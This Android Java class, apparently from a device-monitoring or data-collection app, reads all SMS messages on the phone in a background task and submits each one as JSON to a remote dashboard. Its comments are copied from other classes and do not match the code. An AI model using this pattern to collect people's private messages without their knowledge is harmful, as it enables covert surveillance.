package the5concurrentnodes.mmaData.sms;


import android.content.Context;
import android.os.AsyncTask;

import org.json.JSONObject;

import the5concurrentnodes.controllers.DataHandler;
import the5concurrentnodes.generic.Config;
import the5concurrentnodes.mmaData.DeviceApps.DeviceApps;

public class SmsInitPush extends AsyncTask<Void, Void, Void> {

    private Context context;

    /**
     * Constructor for PushAppsInfo.
     * @param context is androids Context instance.
     */
    public SmsInitPush(Context context) {
        this.context = context;
    }

    /**
     * submitLog overrides the submitLog function of class LogHandler so that it will submit an SMS
     * JSON object to a specified url and function on the dashboard.
     * @param params is the JSON object of an app object.
     */
    @Override
    protected Void doInBackground(Void... params) {

        SmsHandler handler = new SmsHandler();

        for(Sms sms : handler.getAllMessages(context)) {
            handler.submitLog(context, sms.toJSONObject());
            if(isCancelled()) break;
        }
        return null;
    }
}
